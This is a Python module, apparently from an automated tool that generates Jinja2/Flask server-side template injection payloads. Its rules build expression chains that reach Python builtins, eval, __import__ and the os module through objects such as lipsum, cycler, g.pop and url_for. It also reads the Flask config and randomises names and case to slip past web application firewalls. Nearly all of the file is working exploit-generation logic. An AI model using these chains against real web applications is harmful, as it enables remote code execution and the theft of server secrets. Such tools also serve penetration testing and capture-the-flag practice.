import random
import string

# pylint: disable=wildcard-import,unused-wildcard-import,missing-function-docstring,unused-argument
from ..rules_utils import targets_from_pattern
from ..payload_gen import expression_gen, precedence

from ..const import *


def randomcase(s):
    return "".join(c.lower() if random.random() < 0.5 else c.upper() for c in s)


brainrot_varname = random.choice(
    [
        "_233",
        "_114",
        "_1919",
        "QAQ",
        "OvO",
        "orz",
        "ez",
        "tql",
        "ddw",
        "sbwaf",
        "kksk",
        "ohio",
        "otto",
        "miku",
        "teto",
        "noda",
    ]
)
is_brainrot_enabled = random.random() < 0.233

# ---


@expression_gen
def gen_builtins_dict_brainrot(context):
    if not is_brainrot_enabled:
        return [(UNSATISFIED,)]
    # the waf sucks and we're joking about it.
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (
                EXPRESSION,
                precedence["attribute"],
                [(LITERAL, brainrot_varname + ".__eq__")],
            ),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_waftoosimple(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (
                EXPRESSION,
                precedence["attribute"],
                [(LITERAL, "lipsum")],
            ),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_lipsum(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "lipsum"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_varattrs(context):
    # [] cannot used for undefined
    # e['__eq__'] would raise exception
    var_attrs = [
        (FLASK_CONTEXT_VAR, "g", "pop"),
        (FLASK_CONTEXT_VAR, "g", "get"),
        (JINJA_CONTEXT_VAR, "cycler", "next"),
        (JINJA_CONTEXT_VAR, "cycler", "reset"),
        (FLASK_CONTEXT_VAR, "session", "get"),
        (FLASK_CONTEXT_VAR, "request", "close"),
        (JINJA_CONTEXT_VAR, "cycler", "__init__"),
        (JINJA_CONTEXT_VAR, "joiner", "__init__"),
        (JINJA_CONTEXT_VAR, "namespace", "__init__"),
    ]
    alternatives = [
        [
            (
                CHAINED_ATTRIBUTE_ITEM,
                (target_type, obj_name),
                (ATTRIBUTE, attr_name),
                (ATTRIBUTE, "__globals__"),
                (ITEM, "__builtins__"),
            )
        ]
        for target_type, obj_name, attr_name in var_attrs
    ]
    return [(ONEOF, alternatives)]


@expression_gen
def gen_builtins_dict_undefined(context):
    funcs_attrs = [
        ("".join(random.choices(string.ascii_lowercase, k=3)), "__eq__")
        for _ in range(10)
    ]
    alternatives = [
        [
            (
                CHAINED_ATTRIBUTE_ITEM,
                (JINJA_CONTEXT_VAR, obj_name),
                (ATTRIBUTE, attr_name),
                (ATTRIBUTE, "__globals__"),
                (ITEM, "__builtins__"),
            )
        ]
        for obj_name, attr_name in funcs_attrs
    ]
    return [(ONEOF, alternatives)]


@expression_gen
def gen_builtins_dict_safesplit(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["plain_filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "split"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_safejoin(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["plain_filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "join"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_safelower(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["plain_filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "lower"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_safezfill(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["plain_filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "zfill"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


# ---


@expression_gen
def gen_import_func_general(context):
    return [(ITEM, (BUILTINS_DICT,), "__import__")]


# ---


@expression_gen
def gen_eval_func_general(context):
    return [(ITEM, (BUILTINS_DICT,), "eval")]


@expression_gen
def gen_eval_func_mapfilter(context):
    pattern = (
        "{e|e:e}|map(**{'attribute':'__add__'})|map(**{'attribute':'__globals__'})"
        "|map(**{'attribute':'__builtins__'})|map(**{'attribute':'eval'})|first"
    )
    return [
        (
            EXPRESSION,
            precedence["plain_filter"],
            targets_from_pattern(
                pattern,
                {
                    "'attribute'": (GENERATED_EXPR, (STRING, "attribute")),
                    "'__add__'": (GENERATED_EXPR, (STRING, "__add__")),
                    "'__globals__'": (GENERATED_EXPR, (STRING, "__globals__")),
                    "'__builtins__'": (GENERATED_EXPR, (STRING, "__builtins__")),
                    "'eval'": (GENERATED_EXPR, (STRING, "eval")),
                },
            ),
        )
    ]


# ---


@expression_gen
def gen_eval_normal(context, eval_param):
    return [(FUNCTION_CALL, (EVAL_FUNC,), [eval_param])]


# ---

# 获取flask配置的生成规则


@expression_gen
def gen_config_flask_context_var(context):
    return [(EXPRESSION, precedence["literal"], [(FLASK_CONTEXT_VAR, "config")])]


@expression_gen
def gen_config_self(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "self"),
            (ATTRIBUTE, "__dict__"),
            (ITEM, "_TemplateReference__context"),
            (ITEM, "config"),
        )
    ]


# ---


@expression_gen
def gen_module_os_import(context):
    return [(FUNCTION_CALL, (IMPORT_FUNC,), [(STRING, "os")])]


@expression_gen
def gen_module_os_eval(context):
    return [(FUNCTION_CALL, (EVAL, (STRING, "__import__")), [(STRING, "os")])]


# 有500修正了，可以大胆加规则


@expression_gen
def gen_module_os_config(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (CONFIG,),
            (CLASS_ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


@expression_gen
def gen_module_os_gpop(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "pop"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


@expression_gen
def gen_module_os_gget(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "get"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


@expression_gen
def gen_module_os_urlfor(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "url_for"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]
